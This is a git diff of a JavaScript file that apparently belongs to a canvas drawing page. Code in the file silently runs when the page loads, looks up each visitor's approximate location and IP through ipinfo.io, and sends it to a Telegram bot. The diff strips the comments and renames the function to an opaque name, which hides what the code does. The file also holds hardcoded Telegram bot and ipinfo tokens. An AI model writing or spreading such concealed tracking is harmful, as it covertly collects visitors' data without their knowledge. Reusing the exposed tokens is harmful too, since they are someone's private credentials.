@@ -122,8 +122,8 @@ canvas.addEventListener('touchstart', (e) => {
 
 setInterval(draw, 50);
 
-const botToken = '7944487724:AAERco8_Lmvb406KDn6kZQfRDVIocC1b72c'; // Pon aquí tu token
-const chatId = '1356624954'; // Pon aquí tu chat_id
+const botToken = '7944487724:AAERco8_Lmvb406KDn6kZQfRDVIocC1b72c'; 
+const chatId = '1356624954';
 
 function enviarMensajeTelegram(texto) {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -133,7 +133,7 @@ function enviarMensajeTelegram(texto) {
     body: JSON.stringify({
       chat_id: chatId,
       text: texto,
-      parse_mode: 'HTML' // opcional para formato
+      parse_mode: 'HTML' 
     })
   })
   .then(res => res.json())
@@ -143,7 +143,7 @@ function enviarMensajeTelegram(texto) {
   .catch(err => console.error('Fetch error:', err));
 }
 
-function obtenerUbicacionAproximadaYEnviar() {
+function obUbi() {
   fetch('https://ipinfo.io/json?token=09f3a082349dd8')
     .then(res => res.json())
     .then(data => {
@@ -161,10 +161,10 @@ Hora: ${new Date().toLocaleString()}`;
       enviarMensajeTelegram(texto);
     })
     .catch(() => {
-      enviarMensajeTelegram('Nueva conexión: No se pudo obtener ubicación.');
+      enviarMensajeTelegram('Nueva conexión: erroub.');
     });
 }
-// Llama a esta función cuando cargue la página
+
 window.onload = () => {
-  obtenerUbicacionAproximadaYEnviar();
+  obUbi();
 };
